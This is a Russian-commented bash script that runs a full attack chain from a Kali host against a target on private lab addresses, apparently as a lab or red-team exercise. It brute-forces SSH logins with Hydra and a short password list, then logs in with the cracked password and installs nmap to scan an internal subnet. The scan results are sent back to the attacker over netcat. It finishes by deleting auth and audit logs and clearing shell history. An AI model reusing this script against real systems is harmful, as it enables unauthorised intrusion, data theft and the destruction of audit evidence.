#!/bin/bash

KALI_IP="10.0.2.5"
KALI_USER="kali"
KALI_PASS="kali"

TARGET_IP="10.0.2.4"
TARGET_PORT="2222"

ATTACK_USER="alex_adm"
ATTACK_PASS="qwerty123"

WORDLIST_FILE="/tmp/passlist.txt"
INTERNAL_SUBNET="192.168.2.0/24"
EXFIL_PORT=9999

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

print_msg() { echo -e "${BLUE}[*] $1${NC}"; }
print_ok() { echo -e "${GREEN}[OK] $1${NC}"; }
print_err() { echo -e "${RED}[ERROR] $1${NC}"; }

# 1. Проверка связи с Kali
print_msg "Проверка связи с Kali..."
sshpass -p "$KALI_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $KALI_USER@$KALI_IP "id" > /dev/null 2>&1
if [ $? -ne 0 ]; then
    print_err "Нет связи с Kali."
    exit 1
fi
print_ok "Связь есть."

# 2. Формирование списка паролей для брутфорса
print_msg "Подготовка словаря..."
CMD_PREP="
echo '123456' > $WORDLIST_FILE
echo 'root' >> $WORDLIST_FILE
echo 'qwerty' >> $WORDLIST_FILE
echo 'admin2026' >> $WORDLIST_FILE
echo 'asdfghj' >> $WORDLIST_FILE
echo '1qaz2qaz3qaz' >> $WORDLIST_FILE
echo 'zxcvbnm,./' >> $WORDLIST_FILE
echo '1234567890' >> $WORDLIST_FILE
echo '1234' >> $WORDLIST_FILE
echo '000000' >> $WORDLIST_FILE
echo 'password' >> $WORDLIST_FILE
echo 'admin' >> $WORDLIST_FILE
echo 'admin123' >> $WORDLIST_FILE
echo '$ATTACK_PASS' >> $WORDLIST_FILE
"
sshpass -p "$KALI_PASS" ssh $KALI_USER@$KALI_IP "$CMD_PREP"

# 3. Брутфорс пароля
print_msg "Запуск Hydra (Brute-force)..."
sshpass -p "$KALI_PASS" ssh $KALI_USER@$KALI_IP "hydra -l $ATTACK_USER -P $WORDLIST_FILE -s $TARGET_PORT -t 4 ssh://$TARGET_IP -I -V"
print_ok "Брутфорс завершен."

# 4. Внедрение и действие на клиенте
print_msg "Выполнение сценария на жертве..."

print_msg "Запуск слушателя на Kali (ждем 300 сек)..."
sshpass -p "$KALI_PASS" ssh -f $KALI_USER@$KALI_IP "timeout 300 nc -lvnp $EXFIL_PORT > /tmp/loot.txt 2>&1"
sleep 2

print_msg "Подключение к жертве и сканирование (Вывод включен)..."

REMOTE_CMD="
sshpass -p '$ATTACK_PASS' ssh -o StrictHostKeyChecking=no -p $TARGET_PORT $ATTACK_USER@$TARGET_IP '
    echo \"[VICTIM] Connected as \$(whoami)\"
    
    echo \"[VICTIM] Installing Nmap...\"
    echo \"$ATTACK_PASS\" | sudo -S apt-get install -y nmap
    
    echo \"[VICTIM] Starting SCAN of $INTERNAL_SUBNET...\"
    echo \"$ATTACK_PASS\" | sudo -S nmap -sS -F -v -oG /tmp/scan.txt $INTERNAL_SUBNET
    
    echo \"[VICTIM] Checking scan file size:\"
    ls -lh /tmp/scan.txt
    
    echo \"[VICTIM] Sending data to $KALI_IP:$EXFIL_PORT...\"
    sudo cat /tmp/scan.txt | nc -w 5 $KALI_IP $EXFIL_PORT
    
    echo \"[VICTIM] Cleaning up...\"
    echo \"$ATTACK_PASS\" | sudo -S apt-get remove -y nmap > /dev/null 2>&1
    echo \"$ATTACK_PASS\" | sudo -S rm -f /tmp/scan.txt

    echo \"$ATTACK_PASS\" | sudo -S sh -c \"rm -f /var/log/auth.log*\"
    echo \"$ATTACK_PASS\" | sudo -S sh -c \"rm -f /var/log/audit/audit.log*\"
    
    history -c
    echo \"[VICTIM] Mission Complete.\"
'
"

sshpass -p "$KALI_PASS" ssh $KALI_USER@$KALI_IP "$REMOTE_CMD"

# 5. Проверка полученного файла на Kali
print_msg "Проверка данных на Kali..."
sshpass -p "$KALI_PASS" ssh $KALI_USER@$KALI_IP "if [ -s /tmp/loot.txt ]; then echo 'SUCCESS: Loot received'; head -n 5 /tmp/loot.txt; else echo 'FAIL: No loot received'; cat /tmp/loot.txt; fi"

sshpass -p "$KALI_PASS" ssh $KALI_USER@$KALI_IP "rm -f $WORDLIST_FILE /tmp/loot.txt"